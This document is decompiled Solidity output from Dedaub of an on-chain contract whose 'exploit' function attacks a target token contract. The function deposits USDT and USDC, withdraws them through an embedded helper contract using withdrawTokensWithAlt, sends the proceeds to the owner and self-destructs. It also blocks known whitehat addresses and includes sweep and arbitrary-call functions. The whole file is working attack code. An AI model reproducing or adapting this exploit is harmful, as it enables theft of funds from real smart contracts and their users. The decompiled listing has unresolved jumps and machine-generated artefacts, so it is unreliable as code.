// Decompiled by library.dedaub.com
// 2023.12.12 00:18 UTC
// Compiled using the solidity compiler version 0.8.4


// Data structures and variables inferred from the use of storage instructions
uint256 stor_1; // STORAGE[0x1]
uint256 stor_2; // STORAGE[0x2]
uint256 _killMe; // STORAGE[0x0] bytes 0 to 19



function function_selector() public payable { 
}

function exploit(address token) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(tx.origin == _killMe);
    require(tx.origin == msg.sender);
    if (tx.origin != 0x8e80ecb146dc0b835cf3d6c48da97556998f599) {
        if (tx.origin != 0x919393b8eacb9e1f23bcd2f18b7de428687b1cd2) {
            if (tx.origin != 0x190b248f32cee228500fb72e87ab65fa98f258b5) {
                if (tx.origin != 0xc0ffeebabe5d496b2dde509f9fa189c25cf29671) {
                    v0 = v1 = 0;
                } else {
                    v0 = 1;
                }
            } else {
                v0 = v2 = 1;
            }
        } else {
            v0 = v3 = 1;
        }
    } else {
        v0 = v4 = 1;
    }
    require(!v0);
    MEM[(v5.data) len 2137] = 0x608060405234801561001057600080fd5b50600080546001600160a01b03191633179055610827806100326000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806342c596771461003b578063b603cd8014610050575b600080fd5b61004e610049366004610538565b610058565b005b61004e6102ed565b6000546001600160a01b0316331461006f57600080fd5b806001141561012757600080546040516001600160a01b038087169261009c9291169084906024016106e2565b60408051601f198184030181529181526020820180516001600160e01b0316631979845760e21b179052516100d191906106c8565b6000604051808303816000865af19150503d806000811461010e576040519150601f19603f3d011682016040523d82523d6000602084013e610113565b606091505b505090508061012157600080fd5b50505050565b80600214156102e8576000836001600160a01b031683846001600160a01b03166370a08231876040518263ffffffff1660e01b815260040161016991906106d4565b60206040518083038186803b15801561018157600080fd5b505afa158015610195573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101b991906105ab565b6040516024016101ca9291906106fd565b60408051601f198184030181529181526020820180516001600160e01b03166306b091f960e01b179052516101ff91906106c8565b6000604051808303816000865af19150503d806000811461023c576040519150601f19603f3d011682016040523d82523d6000602084013e610241565b606091505b505090508061024f57600080fd5b6000546040516370a0823160e01b8152610121916001600160a01b0390811691908616906370a08231906102879030906004016106d4565b60206040518083038186803b15801561029f57600080fd5b505afa1580156102b3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102d791906105ab565b6001600160a01b0386169190610312565b505050565b6000546001600160a01b0316331461030457600080fd5b6000546001600160a01b0316ff5b6102e88363a9059cbb60e01b84846040516024016103319291906106fd565b60408051601f198184030181529190526020810180516001600160e01b03166001600160e01b03199093169290921790915260006103b8826040518060400160405280602081526020017f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564815250856001600160a01b03166103fb9092919063ffffffff16565b8051909150156102e857808060200190518101906103d69190610585565b6102e85760405162461bcd60e51b81526004016103f290610774565b60405180910390fd5b606061040a8484600085610414565b90505b9392505050565b6060824710156104365760405162461bcd60e51b81526004016103f290610729565b843b6104545760405162461bcd60e51b81526004016103f290610739565b600080866001600160a01b0316858760405161047091906106c8565b60006040518083038185875af1925050503d80600081146104ad576040519150601f19603f3d011682016040523d82523d6000602084013e6104b2565b606091505b50915091506104c28282866104cd565b979650505050505050565b606083156104dc57508161040d565b8251156104ec5782518084602001fd5b8160405162461bcd60e51b81526004016103f29190610718565b8035610511816107cc565b92915050565b8051610511816107e3565b8035610511816107eb565b8051610511816107eb565b60008060006060848603121561054d57600080fd5b60006105598686610506565b935050602061056a86828701610506565b925050604061057b86828701610522565b9150509250925092565b60006020828403121561059757600080fd5b60006105a38484610517565b949350505050565b6000602082840312156105bd57600080fd5b60006105a3848461052d565b6105d281610784565b82525050565b60006105e2825190565b6105f08185602086016107a0565b9290920192915050565b6105d281610795565b600061060d825190565b8084526020840193506106248185602086016107a0565b601f01601f19169290920192915050565b602681526000602082017f416464726573733a20696e73756666696369656e742062616c616e636520666f8152651c8818d85b1b60d21b602082015291505b5060400190565b602a81526000602082017f5361666545524332303a204552433230206f7065726174696f6e20646964206e8152691bdd081cdd58d8d9595960b21b60208201529150610674565b806105d2565b600061040d82846105d8565b6020810161051182846105c9565b604081016106f082856105c9565b61040d60208301846105fa565b6040810161070b82856105c9565b61040d60208301846106c2565b6020808252810161040d8184610603565b6020808252810161051181610635565b6020808252810161051181601d81527f416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000602082015260400190565b602080825281016105118161067b565b60006001600160a01b038216610511565b600060ff8216610511565b60005b838110156107bb5781810151838201526020016107a3565b838111156101215750506000910152565b6107d581610784565b81146107e057600080fd5b50565b8015156107d5565b806107d556fea2646970667358221220176a1158bf3ea1847b9d58b95d785ff837dc1c2e1941c44fc08a6375b1f8050a64736f6c63430008040033;
    v6 = create.code(v5.data, 2137).value(0);
    if (bool(v6)) {
        0xa7d(0x1e8480, token, address(0xdac17f958d2ee523a2206206994597c13d831ec7));
        v7 = v8 = 0;
        while (v7 < 68) {
            MEM[v7 + MEM[64]] = MEM[v7 + (MEM[64] + 32)];
            v7 += 32;
        }
        if (v7 > 68) {
            MEM[MEM[64] + 68] = 0;
        }
        v9, /* uint256 */ v10 = token.depositTokens(address(0xdac17f958d2ee523a2206206994597c13d831ec7), uint24(0x1e8480)).gas(msg.gas);
        if (RETURNDATASIZE() != 0) {
            v11 = new bytes[](RETURNDATASIZE());
            RETURNDATACOPY(v11.data, 0, RETURNDATASIZE());
        }
        require(v9);
        require(bool((address(v6)).code.size));
        v12 = address(v6).call(0x42c59677, token, address(0xdac17f958d2ee523a2206206994597c13d831ec7), 1).gas(msg.gas);
        require(bool(v12), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        v13 = v14 = 0;
        while (v13 < 100) {
            MEM[v13 + MEM[64]] = MEM[v13 + (MEM[64] + 32)];
            v13 += 32;
        }
        if (v13 > 100) {
            MEM[MEM[64] + 100] = 0;
        }
        v15, /* uint256 */ v16 = token.withdrawTokensWithAlt(address(0xdac17f958d2ee523a2206206994597c13d831ec7), address(v6), uint24(10 ** 6)).gas(msg.gas);
        if (RETURNDATASIZE() != 0) {
            v17 = new bytes[](RETURNDATASIZE());
            RETURNDATACOPY(v17.data, 0, RETURNDATASIZE());
        }
        require(v15);
        require(bool((address(v6)).code.size));
        v18 = address(v6).call(0x42c59677, token, address(0xdac17f958d2ee523a2206206994597c13d831ec7), 2).gas(msg.gas);
        require(bool(v18), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        0xa7d(0x1e8480, token, address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48));
        v19 = v20 = 0;
        while (v19 < 68) {
            MEM[v19 + MEM[64]] = MEM[v19 + (MEM[64] + 32)];
            v19 += 32;
        }
        if (v19 > 68) {
            MEM[MEM[64] + 68] = 0;
        }
        v21, /* uint256 */ v22 = token.depositTokens(address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48), uint24(0x1e8480)).gas(msg.gas);
        if (RETURNDATASIZE() != 0) {
            v23 = new bytes[](RETURNDATASIZE());
            RETURNDATACOPY(v23.data, 0, RETURNDATASIZE());
        }
        require(v21);
        require(bool((address(v6)).code.size));
        v24 = address(v6).call(0x42c59677, token, address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48), 1).gas(msg.gas);
        require(bool(v24), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        v25 = v26 = 0;
        while (v25 < 100) {
            MEM[v25 + MEM[64]] = MEM[v25 + (MEM[64] + 32)];
            v25 += 32;
        }
        if (v25 > 100) {
            MEM[MEM[64] + 100] = 0;
        }
        v27, /* uint256 */ v28 = token.withdrawTokensWithAlt(address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48), address(v6), uint24(10 ** 6)).gas(msg.gas);
        if (RETURNDATASIZE() != 0) {
            v29 = new bytes[](RETURNDATASIZE());
            RETURNDATACOPY(v29.data, 0, RETURNDATASIZE());
        }
        require(v27);
        require(bool((address(v6)).code.size));
        v30 = address(v6).call(0x42c59677, token, address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48), 2).gas(msg.gas);
        require(bool(v30), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        v31 = v32 = 1707;
        v33 = v34 = _killMe;
        require(bool((address(0xdac17f958d2ee523a2206206994597c13d831ec7)).code.size));
        v35, v36 = address(0xdac17f958d2ee523a2206206994597c13d831ec7).balanceOf(address(this)).gas(msg.gas);
        require(bool(v35), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v37 = v38 = address(0xdac17f958d2ee523a2206206994597c13d831ec7);
        while (1) {
            require(this.balance >= 0, Error('Address: insufficient balance for call'));
            require((address(v37)).code.size, Error('Address: call to non-contract'));
            v39 = v40 = 0;
            while (v39 < 68) {
                MEM[v39 + MEM[64]] = MEM[v39 + (MEM[64] + 32)];
                v39 += 32;
            }
            if (v39 > 68) {
                MEM[MEM[64] + 68] = 0;
            }
            v41 = address(v37).transfer(address(v33), v36).gas(msg.gas);
            if (RETURNDATASIZE() == 0) {
                v42 = v43 = 96;
            } else {
                v42 = v44 = new bytes[](RETURNDATASIZE());
                RETURNDATACOPY(v44.data, 0, RETURNDATASIZE());
            }
            if (!v41) {
                require(!MEM[v42], v45, MEM[v42]);
                v46 = new bytes[](v47.length);
                v48 = v49 = 0;
                while (v48 < v47.length) {
                    v46[v48] = v47[v48];
                    v48 += 32;
                }
                if (v48 > v47.length) {
                    v46[32][v47.length] = 0;
                }
                revert(Error(v46, v50, 'SafeERC20: low-level call failed'));
            } else {
                if (MEM[v42]) {
                    require(v51 + MEM[v42] - v51 >= 32);
                    require(MEM[v51] == bool(MEM[v51]));
                    require(MEM[v51], Error('SafeERC20: ERC20 operation did not succeed'));
                }
                // Unknown jump to Block {'0x6abB0x72', '0x744B0x72'}. Refer to 3-address code (TAC);
                MEM[MEM[64]] = 0x70a0823100000000000000000000000000000000000000000000000000000000;
                v31 = v52 = 1860;
                v33 = v53 = _killMe;
                MEM[4 + MEM[64]] = address(this);
                require(bool((address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)).code.size));
                v54, /* uint256 */ v51, /* uint256 */ v45 = address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48).staticcall(MEM[(MEM[64]) len 36], MEM[(MEM[64]) len 32]).gas(msg.gas);
                require(bool(v54), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
                MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
                require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
                v36 = MEM[MEM[64]];
                v37 = v55 = address(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48);
                require(bool((address(v6)).code.size));
                v56 = address(v6).killMe().gas(msg.gas);
                require(bool(v56), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
                require(bool((address(this)).code.size));
                v57 = address(this).killMe().gas(msg.gas);
                require(bool(v57), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
                exit;
            }
        }
    } else {
        RETURNDATACOPY(0, 0, RETURNDATASIZE());
        revert(0, RETURNDATASIZE());
    }
}

function 0x3df368bd() public nonPayable { 
    return stor_1;
}

function 0xb0711e08() public nonPayable { 
    return stor_2;
}

function 0xa7d(uint256 varg0, address varg1, address varg2) private { 
    v0 = v1 = !varg0;
    if (varg0) {
        require(bool((address(varg2)).code.size));
        v2, /* uint256 */ v3 = varg2.allowance(address(this), varg1).gas(msg.gas);
        require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v0 = v4 = !v3;
    }
    require(v0, Error('SafeERC20: approve from non-zero to non-zero allowance'));
    if (this.balance >= 0) {
        if (varg2.code.size) {
            v5 = v6 = 0;
            while (v5 < 68) {
                MEM[v5 + MEM[64]] = MEM[v5 + (MEM[64] + 32)];
                v5 += 32;
            }
            if (v5 > 68) {
                MEM[MEM[64] + 68] = 0;
            }
            v7, /* uint256 */ v8, /* uint256 */ v9, /* uint256 */ v10 = varg2.approve(varg1, varg0).gas(msg.gas);
            if (RETURNDATASIZE() == 0) {
                v11 = v12 = 96;
            } else {
                v11 = v13 = new bytes[](RETURNDATASIZE());
                RETURNDATACOPY(v13.data, 0, RETURNDATASIZE());
            }
            if (!v7) {
                require(!MEM[v11], v10, MEM[v11]);
                v14 = new bytes[](v15.length);
                v16 = v17 = 0;
                while (v16 < v15.length) {
                    v14[v16] = v15[v16];
                    v16 += 32;
                }
                if (v16 > v15.length) {
                    v14[32][v15.length] = 0;
                }
                revert(Error(v14, v18, 'SafeERC20: low-level call failed'));
            } else {
                if (MEM[v11]) {
                    require(32 + v11 + MEM[v11] - (32 + v11) >= 32);
                    require(MEM[32 + v11] == bool(MEM[32 + v11]));
                    require(MEM[32 + v11], Error('SafeERC20: ERC20 operation did not succeed'));
                }
                return ;
            }
        } else {
            MEM[4 + MEM[64]] = 32;
            revert(Error('Address: call to non-contract'));
        }
    } else {
        MEM[4 + MEM[64]] = 32;
        revert(Error('Address: insufficient balance for call'));
    }
}

function killMe() public nonPayable { 
    v0 = v1 = msg.sender == _killMe;
    if (msg.sender != _killMe) {
        v0 = v2 = this == msg.sender;
    }
    require(v0);
    selfdestruct(_killMe);
}

function exec(address target, bytes data) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(data <= uint64.max);
    require(4 + data + 31 < msg.data.length);
    require(data.length <= uint64.max, Panic(65)); // failed memory allocation (too much memory)
    v0 = new bytes[](data.length);
    require(!((v0 + (32 + (data.length + 31 & ~0x1f) + 31 & ~0x1f) > uint64.max) | (v0 + (32 + (data.length + 31 & ~0x1f) + 31 & ~0x1f) < v0)), Panic(65)); // failed memory allocation (too much memory)
    require(data.data + data.length <= msg.data.length);
    CALLDATACOPY(v0.data, data.data, data.length);
    v0[data.length] = 0;
    v1 = v2 = msg.sender == _killMe;
    if (msg.sender != _killMe) {
        v1 = this == msg.sender;
    }
    require(v1);
    v3 = v4 = 0;
    while (v3 < v0.length) {
        MEM[v3 + v5.data] = v0[v3];
        v3 += 32;
    }
    if (v3 > v0.length) {
        MEM[v5.data + v0.length] = 0;
    }
    v6, /* uint256 */ v7, /* uint256 */ v8 = target.call(v5.data).gas(msg.gas);
    if (RETURNDATASIZE() == 0) {
        v9 = v10 = 96;
    } else {
        v9 = v11 = new bytes[](RETURNDATASIZE());
        RETURNDATACOPY(v11.data, 0, RETURNDATASIZE());
    }
    require(v6);
    v12 = new uint256[](MEM[v9]);
    v13 = v14 = 0;
    while (v13 < MEM[v9]) {
        MEM[v13 + v12.data] = MEM[v13 + (v9 + 32)];
        v13 += 32;
    }
    if (v13 > MEM[v9]) {
        MEM[v12.data + MEM[v9]] = 0;
    }
    return v12;
}

function claimTokens(address _token) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    v0 = v1 = msg.sender == _killMe;
    if (msg.sender != _killMe) {
        v0 = this == msg.sender;
    }
    require(v0);
    require(bool((address(_token)).code.size));
    v2, /* uint256 */ v3 = _token.balanceOf(address(this)).gas(msg.gas);
    require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    if (v3) {
        require(bool((address(_token)).code.size));
        v4, /* bool */ v5 = _token.transfer(_killMe, v3).gas(msg.gas);
        require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v5 == bool(v5));
    }
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function function_selector( function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        ();
    } else if (0xaeb4ddf == function_selector >> 224) {
        exploit(address);
    } else if (0x3df368bd == function_selector >> 224) {
        0x3df368bd();
    } else if (0xb0711e08 == function_selector >> 224) {
        0xb0711e08();
    } else if (0xb603cd80 == function_selector >> 224) {
        killMe();
    } else if (0xbe6002c2 == function_selector >> 224) {
        exec(address,bytes);
    } else if (0xdf8de3e7 == function_selector >> 224) {
        claimTokens(address);
    } else {
        exit;
    }
}
